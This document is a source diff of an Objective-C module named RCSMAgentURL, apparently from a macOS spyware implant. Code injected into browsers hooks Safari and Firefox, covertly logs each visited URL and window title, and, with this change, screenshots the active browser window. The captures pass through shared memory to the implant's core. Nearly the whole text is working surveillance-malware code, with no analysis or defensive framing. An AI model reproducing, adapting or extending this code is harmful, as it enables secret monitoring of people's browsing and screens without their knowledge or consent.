@@ -16,43 +16,331 @@
 #import "RCSMAgentURL.h"
 #import "RCSMCommon.h"
 
-//#define DEBUG
+#import "RCSMDebug.h"
+#import "RCSMLogger.h"
 
 #define BROWSER_UNKNOWN      0x00000000
 #define BROWSER_SAFARI       0x00000004
 #define BROWSER_MOZILLA      0x00000002
 #define BROWSER_TYPE_MASK    0x3FFFFFFF
 
-static NSDate   *gURLDate = nil;
-static NSString *gPrevURL = nil;
+static NSDate   *gURLDate     = nil;
+static NSString *gPrevURL     = nil;
+static BOOL gIsSnapshotActive = NO;
+static u_int gSnapID          = 0;
+
+
+void logSnapshot(NSData *imageData, int browserType)
+{
+  NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(urlSnapAdditionalStruct)];
+  NSString *_windowName;
+  NSData *windowName;
+  NSDictionary *windowInfo;
+
+  u_int currentSnapID = gSnapID;
+  gSnapID++;
+
+  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
+    {
+#ifdef DEBUG_URL
+      infoLog(@"No windowInfo found");
+#endif
+      _windowName = @"";
+    }
+  else
+    {
+      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
+        {
+#ifdef DEBUG_URL
+          infoLog(@"windowName is empty");
+#endif
+          _windowName = @"";
+        }
+      else
+        {
+          _windowName = [windowInfo objectForKey: @"windowName"];
+        }
+    }
+
+#ifdef DEBUG_URL
+  infoLog(@"windowName: %@", _windowName);
+#endif
+  windowName = [[NSMutableData alloc] initWithData:
+                    [_windowName dataUsingEncoding:
+                    NSUTF16LittleEndianStringEncoding]];
+
+  urlSnapAdditionalStruct *urlSnapshotAdditionalHeader = (urlSnapAdditionalStruct *)[entryData bytes];
+  urlSnapshotAdditionalHeader->version        = LOG_URLSNAP_VERSION;
+  urlSnapshotAdditionalHeader->browserType    = browserType;
+  urlSnapshotAdditionalHeader->urlNameLen     = [gPrevURL
+    lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  urlSnapshotAdditionalHeader->windowTitleLen = [_windowName
+    lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+
+  // URL
+  [entryData appendData: [gPrevURL dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
+
+  // Window Name
+  [entryData appendData: windowName];
+
+  // Now append the image
+  [entryData appendData: imageData];
+
+#ifdef DEBUG_URL
+  infoLog(@"imageData size: %d", [imageData length]);
+  infoLog(@"URL: %@", gPrevURL);
+  infoLog(@"window: %@", _windowName);
+#endif
+
+  int leftBytesLength = 0;
+  int byteIndex       = 0;
+
+  if ([entryData length] > MAX_COMMAND_DATA_SIZE)
+    {
+#ifdef DEBUG_URL
+      warnLog(@"Splitting image on shared memory");
+#endif
+
+      do
+        {
+          NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+          shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+
+          leftBytesLength = (([entryData length] - byteIndex >= 0x300)
+                             ? 0x300
+                             : ([entryData length] - byteIndex));
+
+          shMemoryHeader->status          = SHMEM_WRITTEN;
+          shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
+          shMemoryHeader->direction       = D_TO_CORE;
+
+          //
+          // If it's the first log pass create log header
+          // if it's the last close log otherwise just data
+          //
+          if (byteIndex == 0)
+            {
+#ifdef DEBUG_URL
+              infoLog(@"Sending CM_CREATE_LOG_HEADER (%d)", currentSnapID);
+#endif
+              shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
+            }
+          else if ((byteIndex + leftBytesLength) == [entryData length])
+            {
+#ifdef DEBUG_URL
+              infoLog(@"Sending CM_CLOSE_LOG (%d)", currentSnapID);
+#endif
+              shMemoryHeader->commandType     = CM_CLOSE_LOG;
+            }
+          else
+            {
+#ifdef DEBUG_URL
+              //infoLog(@"Sending CM_LOG_DATA");
+#endif
+              shMemoryHeader->commandType     = CM_LOG_DATA;
+            }
+
+          struct timeval tTime;
+          gettimeofday(&tTime, NULL);
+          int highSec = (int32_t)tTime.tv_sec << 20;
+
+          shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
+
+          // Snapshot ID in order to log multiple pictures concurrently
+          shMemoryHeader->flag            = currentSnapID;
+          shMemoryHeader->commandDataSize = leftBytesLength;
+
+          memcpy(shMemoryHeader->commandData,
+                 [entryData bytes] + byteIndex,
+                 leftBytesLength);
+
+          if ([mSharedMemoryLogging writeMemory: logData
+                                         offset: 0
+                                  fromComponent: COMP_AGENT] == TRUE)
+            {
+#ifdef DEBUG_URL
+              verboseLog(@"URL snapshot sent through Shared Memory");
+#endif
+            }
+          else
+            {
+#ifdef DEBUG_URL
+              errorLog(@"Error while logging url snapshot to shared memory");
+#endif
+            }
+
+          byteIndex += leftBytesLength;
+          [logData release];
+
+          usleep(60000);
+        } while (byteIndex < [entryData length]);
+    }
+  else
+    {
+      NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+
+      shMemoryHeader->status          = SHMEM_WRITTEN;
+      shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
+      shMemoryHeader->direction       = D_TO_CORE;
+      shMemoryHeader->commandType     = CM_LOG_DATA;
+      shMemoryHeader->flag            = 0;
+      shMemoryHeader->commandDataSize = [entryData length];
+
+      memcpy(shMemoryHeader->commandData,
+             [entryData bytes],
+             [entryData length]);
+
+      if ([mSharedMemoryLogging writeMemory: logData
+                                     offset: 0
+                              fromComponent: COMP_AGENT] == TRUE)
+        {
+#ifdef DEBUG_URL
+          verboseLog(@"URL snapshot sent through Shared Memory");
+#endif
+        }
+      else
+        {
+#ifdef DEBUG_URL
+          errorLog(@"Error while logging url snapshot to shared memory");
+#endif
+        }
+
+      [logData release];
+    }
+
+#ifdef DEBUG_URL
+  infoLog(@"URL Snapshot sent");
+#endif
+
+  [entryData release];
+  [windowName release];
+  [_windowName release];
+}
+
+BOOL grabSnapshot(int browserType)
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+
+  NSDictionary *windowInfo;
+  CGImageRef screenShot;
+  NSBitmapImageRep *bitmapRep;
+
+  //
+  // Looks like it's better to wait at least a second in order to be sure
+  // to get the window on the desktop in case of onProcess->Screenshot
+  //
+  sleep(1);
+
+  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
+    {
+#ifdef DEBUG_URL
+      errorLog(@"getActiveWindowInfo returned nil");
+#endif
+      [outerPool release];
+      return NO;
+    }
+
+  if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
+    {
+#ifdef DEBUG_URL
+      errorLog(@"windowID is zero");
+#endif
+      return NO;
+    }
+
+  screenShot = CGWindowListCreateImage(CGRectNull,
+                                       kCGWindowListOptionIncludingWindow,
+                                       [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
+                                       kCGWindowImageBoundsIgnoreFraming);
+
+  if (screenShot == NULL)
+    {
+#ifdef DEBUG_URL
+      errorLog(@"screenshot is NULL");
+#endif
+      return NO;
+    }
+  
+  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
+  NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
+                                             properties: nil];
+
+  //
+  // Log Snapshot
+  //
+  logSnapshot(tempData, browserType);
+
+  [bitmapRep release];
+  CGImageRelease(screenShot);
+  
+  [outerPool release];
+
+  return YES;
+}
+
+void URLStartAgent()
+{
+  //
+  // Read configuration
+  //
+  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
+                                                                 forAgent: AGENT_URL
+                                                          withCommandType: CM_AGENT_CONF];
+  
+  if (readData != nil)
+    {
+#ifdef DEBUG_URL
+      infoLog(@"Found configuration for Agent URL");
+#endif
+      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
+      NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                              length: shMemLog->commandDataSize];
+      urlStruct *urlConfiguration = (urlStruct *)[confData bytes];
+      gIsSnapshotActive = urlConfiguration->isSnapshotActive;
+      
+#ifdef DEBUG_URL
+      infoLog(@"snapshot active: %@", (gIsSnapshotActive == YES) ? @"YES" : @"NO");
+#endif
+      [confData release];
+    }
+  else
+    {
+#ifdef DEBUG_URL
+      infoLog(@"No configuration found for agent URL");
+#endif
+    }
+}
 
 @interface myLoggingObject : NSObject
 
-- (void)logURL: (NSString *)URL;
+- (void)logURL: (NSDictionary *)aDict;
 
 @end
 
 @implementation myLoggingObject
 
-- (void)logURL: (NSString *)URL
+- (void)logURL: (NSDictionary *)aDict
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   NSTimeInterval interval;
   
-  if (URL == nil)
+  if (aDict == nil)
     return;
     
+  NSString *URL = (NSString*)[aDict objectForKey: @"url"];
+  
   if (gURLDate == nil)
     {
       gURLDate = [[NSDate date] retain];
-#ifdef DEBUG
-      NSLog(@"first gURLDate: %@", gURLDate);
+#ifdef DEBUG_URL
+      infoLog(@"first gURLDate: %@", gURLDate);
 #endif
     }
   
   interval = [[NSDate date] timeIntervalSinceDate: gURLDate];
-#ifdef DEBUG
-  NSLog(@"interval : %f", interval);
+#ifdef DEBUG_URL
+  infoLog(@"interval : %f", interval);
 #endif
   
   NSString *tempUrl1 = [URL stringByReplacingOccurrencesOfString: @"http://"
@@ -61,10 +349,10 @@ static NSString *gPrevURL = nil;
                                                       withString: @""];
   NSString *tempUrl3 = [URL stringByReplacingOccurrencesOfString: @"www."
                                                       withString: @""];
-#ifdef DEBUG_VERBOSE
-  NSLog(@"tempURL1: %@", tempUrl1);
-  NSLog(@"tempURL2: %@", tempUrl2);
-  NSLog(@"tempURL3: %@", tempUrl3);
+#ifdef DEBUG_URL
+  verboseLog(@"tempURL1: %@", tempUrl1);
+  verboseLog(@"tempURL2: %@", tempUrl2);
+  verboseLog(@"tempURL3: %@", tempUrl3);
 #endif
   
   //
@@ -80,8 +368,8 @@ static NSString *gPrevURL = nil;
           || [gPrevURL isEqualToString: tempUrl3])
       && interval <= (double)5)
     {
-#ifdef DEBUG
-      NSLog(@"URL already logged <= 5 seconds ago");
+#ifdef DEBUG_URL
+      infoLog(@"URL already logged <= 5 seconds ago");
 #endif
       return;
     }
@@ -94,9 +382,9 @@ static NSString *gPrevURL = nil;
   [gURLDate release];
   gURLDate = [[NSDate date] retain];
   
-#ifdef DEBUG
-  NSLog(@"%s URL: %@", __FUNCTION__, URL);
-  NSLog(@"Sleeping for grabbing the correct window title");
+#ifdef DEBUG_URL
+  infoLog(@"URL: %@", URL);
+  infoLog(@"Sleeping for grabbing the correct window title");
 #endif
   
   // In order to avoid grabbing a wrong window title
@@ -147,9 +435,10 @@ static NSString *gPrevURL = nil;
   // Log Marker/Version (retrocompatibility)
   [entryData appendBytes: &logVersion
                   length: sizeof(logVersion)];
-#ifdef DEBUG
-  NSLog(@"entryData: %@", entryData);
+#ifdef DEBUG_URL
+  verboseLog(@"entryData: %@", entryData);
 #endif
+
   // URL Name
   [entryData appendData: url];
   
@@ -160,7 +449,7 @@ static NSString *gPrevURL = nil;
                   length: sizeof(short)];
   
   // Browser Type
-  int browserType = BROWSER_SAFARI;
+  int browserType = [[aDict objectForKey: @"agent"] intValue];
   
   [entryData appendBytes: &browserType
                   length: sizeof(browserType)];
@@ -168,8 +457,8 @@ static NSString *gPrevURL = nil;
   // Window Name
   if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
     {
-#ifdef DEBUG
-      NSLog(@"%s No windowInfo found", __FUNCTION__);
+#ifdef DEBUG_URL
+      infoLog(@"No windowInfo found");
 #endif
       [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
     }
@@ -177,9 +466,9 @@ static NSString *gPrevURL = nil;
     {
       if ([[windowInfo objectForKey: @"windowName"] length] == 0)
         {
-#ifdef DEBUG
-          NSLog(@"%s windowName is empty", __FUNCTION__);
-          NSLog(@"%s processName %@", __FUNCTION__, [windowInfo objectForKey: @"processName"]);
+#ifdef DEBUG_URL
+          infoLog(@"windowName is empty");
+          infoLog(@"processName %@", [windowInfo objectForKey: @"processName"]);
 #endif
           [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
         }
@@ -187,8 +476,8 @@ static NSString *gPrevURL = nil;
         {
           _windowName = [[windowInfo objectForKey: @"windowName"] copy];
           
-#ifdef DEBUG
-          NSLog(@"%s windowName: %@", __FUNCTION__, _windowName);
+#ifdef DEBUG_URL
+          infoLog(@"windowName: %@", _windowName);
 #endif
           windowName = [[NSMutableData alloc] initWithData:
                         [_windowName dataUsingEncoding:
@@ -209,8 +498,8 @@ static NSString *gPrevURL = nil;
   [entryData appendBytes: &del
                   length: sizeof(del)];
   
-#ifdef DEBUG
-  NSLog(@"entryData final: %@", entryData);
+#ifdef DEBUG_URL
+  infoLog(@"entryData final: %@", entryData);
 #endif
   
   // Log buffer
@@ -225,26 +514,37 @@ static NSString *gPrevURL = nil;
          [entryData bytes],
          [entryData length]);
   
-  //NSLog(@"logData: %@", logData);
+  //infoLog(@"logData: %@", logData);
   
   if ([mSharedMemoryLogging writeMemory: logData 
                                  offset: 0
                           fromComponent: COMP_AGENT] == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"URL logged correctly");
+#ifdef DEBUG_URL
+      infoLog(@"URL logged correctly");
 #endif
     }
   else
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Error while logging url to shared memory");
+#ifdef DEBUG_URL
+      infoLog(@"Error while logging url to shared memory");
 #endif
     }
   
   [logData release];
   [entryData release];
   [outerPool drain];
+
+  if (gIsSnapshotActive)
+    {
+#ifdef DEBUG_URL
+      infoLog(@"Grabbing snapshot");
+#endif
+
+      grabSnapshot(browserType);
+    }
+  
+  [aDict release];
 }
 
 @end
@@ -255,18 +555,28 @@ static NSString *gPrevURL = nil;
 {
   [self webFrameLoadCommittedHook: arg1];
   
-#ifdef DEBUG
-  NSLog(@"%s", __FUNCTION__);
+#ifdef DEBUG_URL
+  infoLog(@"");
 #endif
-
+  
+  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
   NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
+  
   myLoggingObject *logObject = [[myLoggingObject alloc] init];
+  
+#ifdef DEBUG_URL     
+  NSLog(@"get _url: %@", _url);
+#endif
+  
+  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
+                           _agent, @"agent", nil];
   
   [NSThread detachNewThreadSelector: @selector(logURL:)
                            toTarget: logObject
-                         withObject: _url];
+                         withObject: urlDict];
   
   [logObject release];
+  [_agent release];
   [_url release];
 }
 
@@ -278,8 +588,8 @@ static NSString *gPrevURL = nil;
 - (void)textDidEndEditingHook: (NSNotification *)aNotification
 {
   [self textDidEndEditingHook: (aNotification)];
-#ifdef DEBUG
-  NSLog(@"Delegate: %@", [self delegate]);
+#ifdef DEBUG_URL
+  infoLog(@"Delegate: %@", [self delegate]);
 #endif
   NSURL *_url = [[self delegate] _locationFieldURL];
   NSString *url = [_url absoluteString];
@@ -291,20 +601,20 @@ static NSString *gPrevURL = nil;
 
   shMemoryHeader->commandDataSize = [url lengthOfBytesUsingEncoding: NSUTF8StringEncoding];
   strncpy(shMemoryHeader->commandData, [url UTF8String] , shMemoryHeader->commandDataSize);
-#ifdef DEBUG
-  NSLog(@"logData: %@", logData);
+#ifdef DEBUG_URL
+  infoLog(@"logData: %@", logData);
 #endif
 
   if ([mSharedMemoryLogging writeMemory: logData
                                  offset: OFFT_URL
                           fromComponent: COMP_AGENT] == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"Logged: %@", url);
+#ifdef DEBUG_URL
+      infoLog(@"Logged: %@", url);
 #endif
     }
   else
-    NSLog(@"Error while logging url to shared memory");
+    infoLog(@"Error while logging url to shared memory");
   
   [logData release];
   
@@ -314,77 +624,65 @@ static NSString *gPrevURL = nil;
 @end
 
 typedef char* get_url_t(); 
+*/
+
+extern char *get_url32();
+extern char *get_url64();
 
 @implementation NSWindow (firefoxHook)
 
 - (void)setTitleHook:(NSString *)title
 {
-  get_url_t* get_url;
-  
   [self setTitleHook: (title)];
   
-#ifdef DEBUG
-  NSLog(@"firefox setTitle: '%@'", title);
+// Disable for 32bit browser
+#ifdef __x86_64__
+
+#ifdef DEBUG_URL
+  infoLog(@"firefox setTitle: '%@'", title);
 #endif
-  
-  void * ffurllib = dlopen("/Library/InputManagers/RCSMInputManager/RCSMInputManager.bundle/Contents/MacOS/libffurl.dylib", RTLD_LAZY);
-  
-  if(ffurllib == 0)
-    {
-#ifdef DEBUG
-      NSLog(@"Cannot loading ffurl.dylib: <%s>", dlerror());
-#endif
-      return;
-    }
-  
-  get_url = (get_url_t*) dlsym(ffurllib, "get_url");
-  
-  if(get_url == 0)
-    {
-#ifdef DEBUG      
-      NSLog(@"Cannot get get_url function");
-#endif      
-      return;
-    }
-  
-  char* ff_url = get_url();
+
+  char* ff_url = get_url32();
 
   if(ff_url == NULL)
     {
-#ifdef DEBUG      
-      NSLog(@"Cannot get _url");
+      // Try to get url on 64bit headers
+      ff_url = get_url64();
+      
+      if (ff_url == NULL) 
+      {
+#ifdef DEBUG_URL     
+        NSLog(@"Cannot get _url");
 #endif      
-      return;
+        return;
+      }
     }
 
-#ifdef DEBUG
-  NSLog(@"firefox url: %s", ff_url);
+#ifdef DEBUG_URL
+  infoLog(@"firefox url: %s", ff_url);
+#endif
+
+  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_MOZILLA];
+  NSString *_url = [[NSString alloc] initWithCString: ff_url encoding: NSUTF8StringEncoding];
+
+  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
+                           _agent, @"agent", nil];
+#ifdef DEBUG_URL     
+  NSLog(@"get urlDict: %@", urlDict);
 #endif
   
-  NSData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  myLoggingObject *logObject = [[myLoggingObject alloc] init];
   
-  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
-  shMemoryHeader->agentID = AGENT_URL;
-  shMemoryHeader->direction = D_TO_CORE;
-  shMemoryHeader->commandDataSize = MAX(strlen(ff_url), MAX_COMMAND_DATA_SIZE);
-  strncpy(shMemoryHeader->commandData, ff_url , shMemoryHeader->commandDataSize);
+  [NSThread detachNewThreadSelector: @selector(logURL:)
+                           toTarget: logObject
+                         withObject: urlDict];
   
-  if ([mSharedMemoryLogging writeMemory: logData 
-                                 offset: OFFT_URL 
-                          fromComponent: COMP_AGENT] == TRUE)
-    {
-#ifdef DEBUG
-      NSLog(@"Firefox Logged!");
+  [logObject release];
+  [_agent release];
+  [_url release];
+
 #endif
-    }
-  else
-#ifdef DEBUG
-    NSLog(@"Error while logging url to shared memory");
-#endif
-  
-  [logData release]; 
-  
 }
 
 @end
-*/
+
